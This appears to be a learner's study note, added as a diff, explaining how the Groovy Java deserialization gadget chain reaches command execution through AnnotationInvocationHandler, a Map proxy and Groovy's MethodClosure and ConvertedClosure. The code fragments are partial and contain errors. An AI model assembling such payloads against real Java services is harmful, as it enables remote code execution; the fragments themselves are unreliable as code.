@@ -1,0 +1,91 @@
+
+our entry class should have a usefull definition of readObject() in it
+
+class AnnotationInvocationHandler implements InvocationHandler, Serializable{}
+
+this is class we will be using as it is Serializable and takes
+
+Class<? extends Annotation> type, Map<String, Object> memberValue as the parmaters
+
+a Annoation class and Map object
+
+
+readObject
+
+ for (Map.Entry<String, Object> memberValue : memberValues.entrySet())
+
+entrySet method is called all the objects in map
+
+first we got bring the class and its methods into our context, we can use refection to do that
+
+String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
+// name of the class that we need
+
+Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructor()[0];
+
+// Class.forName -> return the specified class object
+// Objectoftheclass.getDeclaredConstuctor() -> returns a array of Constructor object and the required parameter for the constructor
+
+Now we have the constructor of the class
+
+our constuctor two parmaters as we know they are 
+
+Class<? extends Annotation> type -> undetermined class but it should be extending Annotation
+Map<String, Object> memberValues -> map object
+
+also we have check in readObject that should be true
+
+AnnotationType annotationType = null;
+        try {
+            annotationType = AnnotationType.getInstance(type);
+        } catch(IllegalArgumentException e) {
+        }
+
+so our first parameter shoudl be of AnnotationType, which is done using Override.class // which i still dont understand how
+
+Now we use java proxy to enter someother class for the second parmater
+
+When a proxy object is invoked, the proxy decides if it has to invoke the original method or some handler, the handler may do its taks and may also call the orignal method
+
+Map test = (Map) Proxy.newProxyInstance(test.class.getClassLoader(), new Class[] {Map.class}, handler);
+
+This creates a Proxy object of map type that we pass as second parameter
+
+when the second_parameter.entrySet() method is called when the our payload is deserialized, our proxy invokes the handler
+
+now we have to find a good handler that can do something intersting
+
+groovy can create anonymous function using closure class
+
+convertedClosure test = new ConvertedClosure(Closure closure, String method)
+
+the closure can created using MethodClosureclass 
+
+public MethodClosure(Object owner, String method)
+
+thus 
+
+MethodClosure method = new MethodClosure("cmd", execute);
+
+in grovvy to run system commds we can user string.execute
+
+ConvertedClosure pay = new ConvertedClosure(method, "entrySet");
+
+now we defined a new method called entrySet which will execute cmd
+
+Map test = (Map) Proxy.newProxyInstance(test.class.getClassLoader(), new Class[] {Map.class}, pay);
+
+so initially
+
+when our payload get deserialized, 
+
+-> we have sent a AnnotationInvocationHandler object
+
+-> readObject is called in that object
+
+-> readObject implemenation calls entrySet() in all objects of map
+
+-> we have replaced the map object with a proxy that has closure object which has a definition for entrySet()
+
+thus we get code execution
+
